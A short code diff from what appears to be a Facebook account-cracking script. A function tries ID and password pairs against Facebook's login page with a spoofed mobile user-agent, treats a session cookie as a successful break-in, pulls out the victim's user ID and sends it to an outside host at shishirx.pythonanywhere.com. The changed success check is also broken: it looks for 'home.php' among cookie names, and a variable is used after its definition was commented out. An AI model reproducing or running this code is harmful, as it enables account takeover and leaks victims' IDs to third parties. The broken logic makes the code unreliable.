@@ -1248,7 +1248,7 @@ def m6(idf,pw):
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36'}
    lo = session.post('https://www.secure.facebook.com/login/',data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
-   if 'c_user' in log_cookies:
+   if 'home.php' in log_cookies:
     #coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
     user = re.findall('c_user=(.*);xs', coki)[0]
     url = f"https://shishirx.pythonanywhere.com/lock?uid={user}"
